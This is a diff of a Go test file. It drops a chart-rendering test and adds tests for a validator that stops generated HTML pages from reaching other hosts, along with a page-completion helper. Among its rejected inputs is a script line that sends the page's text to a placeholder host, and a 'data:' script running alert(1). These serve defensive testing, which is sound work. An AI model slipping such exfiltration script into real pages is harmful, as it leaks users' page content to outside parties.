@@ -5,32 +5,6 @@ import (
 	"testing"
 )
 
-// The three kinds draw: a frame, the labels, a shape per point, and the
-// title escaped, so a label with a bracket in it is a label.
-func TestChartsDraw(t *testing.T) {
-	arguments := &chartArguments{Title: "Mail by sender <2026>", Labels: []string{"Sam", "Maria", "Bob & co"}, Series: []chartSeries{{Name: "messages", Values: []float64{3, 1, 2}}}, Unit: "messages"}
-	bars := drawBars(arguments)
-	for _, want := range []string{"<svg", "Mail by sender &lt;2026&gt;", "Bob &amp; co", `<rect x=`, "</svg>", "messages"} {
-		if !strings.Contains(bars, want) {
-			t.Fatalf("bars lack %q", want)
-		}
-	}
-	if strings.Count(bars, "<rect x=") < 3 {
-		t.Fatal("a bar per point")
-	}
-	lines := drawLines(arguments)
-	if !strings.Contains(lines, "<polyline") || strings.Count(lines, "<circle") != 3 {
-		t.Fatal("a line through three points")
-	}
-	pie := drawPie(arguments)
-	if strings.Count(pie, "<path") != 3 || !strings.Contains(pie, "(50%)") {
-		t.Fatalf("three slices with shares: %s", pie)
-	}
-	if niceMax(37) != 50 || niceMax(3) != 5 || niceMax(0) != 1 || niceMax(100) != 100 {
-		t.Fatalf("niceMax: %v %v %v %v", niceMax(37), niceMax(3), niceMax(0), niceMax(100))
-	}
-}
-
 func TestReachesOut(t *testing.T) {
 	if reachesOut(`<html><body><svg><rect/></svg><script>draw()</script></body></html>`) != "" {
 		t.Fatal("an inline page is fine")
@@ -40,6 +14,39 @@ func TestReachesOut(t *testing.T) {
 	}
 	if reachesOut(`<link rel="stylesheet" href="https://x/y.css">`) == "" {
 		t.Fatal("a stylesheet from elsewhere never loads")
+	}
+	page := `<link href="/assets/artifact.css" rel="stylesheet" /><script src="/assets/echarts.min.js"></script><script defer src='/assets/artifact.js'></script><div class="chart"></div><script>teanode.chart(document.querySelector('.chart'), {})</script>`
+	if reason := reachesOut(page); reason != "" {
+		t.Fatalf("what this server offers is not reaching out: %s", reason)
+	}
+	if reachesOut(`<script src="/assets/other.js"></script>`) == "" {
+		t.Fatal("only the offered files")
+	}
+	if reachesOut(`<script src="data:text/javascript,alert(1)"></script>`) == "" {
+		t.Fatal("a data address is not this server's either")
+	}
+	for _, leaving := range []string{`<meta http-equiv="refresh" content="0;url=https://x/">`, `<script>location.href='https://x/?'+document.body.innerText</script>`, `<a href="https://x/">out</a>`, `<form action="https://x/"></form>`} {
+		if reachesOut(leaving) == "" {
+			t.Fatalf("a page may not leave: %s", leaving)
+		}
+	}
+}
+
+// A page gets the look on its own, and the chart library when it draws a
+// chart, at the head of the document; a page that linked them keeps its
+// own links.
+func TestCompletePage(t *testing.T) {
+	plain := completePage(`<html><head><title>x</title></head><body><p>hi</p></body></html>`)
+	if !strings.HasPrefix(plain, `<html><head><link rel="stylesheet" href="/assets/artifact.css"><title>`) || strings.Contains(plain, "echarts") {
+		t.Fatalf("a plain page gets the look and nothing else: %s", plain)
+	}
+	chart := completePage(`<body><div class="chart"></div><script>teanode.chart(document.querySelector('.chart'), {})</script></body>`)
+	if !strings.HasPrefix(chart, `<head><link rel="stylesheet" href="/assets/artifact.css"><script src="/assets/echarts.min.js"></script><script src="/assets/artifact.js"></script></head><body>`) {
+		t.Fatalf("a chart page gets the library before the body: %s", chart)
+	}
+	linked := `<html><head><link href="/assets/artifact.css" rel="stylesheet"><script src="/assets/echarts.min.js"></script><script src="/assets/artifact.js"></script></head><body></body></html>`
+	if completePage(linked) != linked {
+		t.Fatal("a page that linked them keeps its own links")
 	}
 }
 
